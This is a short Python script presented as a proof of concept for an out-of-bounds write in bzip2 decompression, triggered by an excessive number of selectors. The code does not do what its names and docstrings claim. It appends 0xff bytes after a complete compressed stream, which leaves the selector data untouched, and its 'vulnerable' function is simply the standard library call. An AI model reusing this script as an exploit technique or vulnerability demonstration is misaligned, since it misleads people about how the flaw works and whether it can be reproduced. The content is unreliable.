import bz2
import os

def create_malicious_bz2_data(num_selectors):
    """Creates a bz2 compressed file with a large number of selectors, triggering the potential vulnerability."""
    block_size = 100
    data = b'A' * block_size
    compressed_data = bz2.compress(data)


    modified_compressed_data = compressed_data
    for i in range (num_selectors):
        modified_compressed_data += b'\xff'
    return modified_compressed_data


def vulnerable_decompress(compressed_data):
    """Simulates the vulnerable decompression process with an out-of-bounds write. Note that the real vulnerability is in C not Python code, this is just for demonstration purposes."""
    try:
      decompressed_data = bz2.decompress(compressed_data)
      return decompressed_data
    except Exception as e:
      return f"Decompression failed with: {e}"

if __name__ == "__main__":
    num_selectors = 10000
    malicious_data = create_malicious_bz2_data(num_selectors)
    decompressed = vulnerable_decompress(malicious_data)
    print(f"Decompressed data (or error): {decompressed[:100]}")